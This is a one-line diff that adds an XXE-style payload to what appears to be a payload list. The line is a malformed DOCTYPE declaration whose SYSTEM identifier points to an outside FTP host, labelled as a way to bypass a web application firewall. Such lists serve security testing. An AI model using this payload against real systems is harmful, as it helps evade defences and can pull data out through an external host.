@@ -1,0 +1,2 @@
+<!DOCTYPE:_-_:SYSTEM "ftp://domain/"> - Bypass WAF
+
